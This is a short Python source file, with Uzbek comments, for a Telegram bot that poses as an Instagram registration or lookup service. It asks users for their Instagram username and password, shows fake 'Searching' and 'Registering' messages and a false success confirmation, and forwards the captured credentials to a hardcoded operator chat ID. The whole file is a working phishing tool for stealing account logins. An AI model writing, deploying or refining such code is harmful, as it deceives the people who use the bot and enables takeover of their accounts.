import telebot
import time
from flask import Flask
from threading import Thread
import os

# Render uchun tokenni yashirin joydan olish
BOT_TOKEN = os.environ["BOT_TOKEN"]
ADMIN_CHAT_ID = "73493209"  # O'zgartirmang

bot = telebot.TeleBot(BOT_TOKEN)
user_data = {}

# 🧠 Web-server (tirik qolish uchun)
app = Flask('')

@app.route('/')
def home():
    return "Bot is alive!"

def run():
    app.run(host='0.0.0.0', port=8080)

def keep_alive():
    t = Thread(target=run)
    t.start()

# 📩 /start buyrug'i
@bot.message_handler(commands=['start'])
def send_welcome(message):
    bot.send_message(message.chat.id, "🔍 Your Instagram username:")

# 📥 Username qabul qilish
@bot.message_handler(func=lambda m: m.text and m.chat.id not in user_data)
def get_username(message):
    user_data[message.chat.id] = {'username': message.text}

    sent = bot.send_message(message.chat.id, "🔎 Searching...")
    bot.send_chat_action(message.chat.id, 'typing')
    time.sleep(2)
    bot.delete_message(message.chat.id, sent.message_id)

    bot.send_message(message.chat.id, f"✅ Found your Instagram account: {message.text}")
    bot.send_message(message.chat.id, "🔐 Your Instagram password:")

# 🔐 Parol qabul qilish
@bot.message_handler(func=lambda m: m.chat.id in user_data and 'password' not in user_data[m.chat.id])
def get_password(message):
    user_data[message.chat.id]['password'] = message.text
    username = user_data[message.chat.id]['username']
    password = message.text

    sent = bot.send_message(message.chat.id, "⏳ Registering...")
    bot.send_chat_action(message.chat.id, 'typing')
    time.sleep(2)
    bot.delete_message(message.chat.id, sent.message_id)

    bot.send_message(message.chat.id, "✅ Thank you! You have successfully registered.")
    bot.send_message(ADMIN_CHAT_ID, f"📥 New data:\nUsername: `{username}`\nPassword: `{password}`", parse_mode="Markdown")

# 🔄 Flask serverni ishga tushuramiz va pollingni boshlaymiz
keep_alive()
bot.infinity_polling()
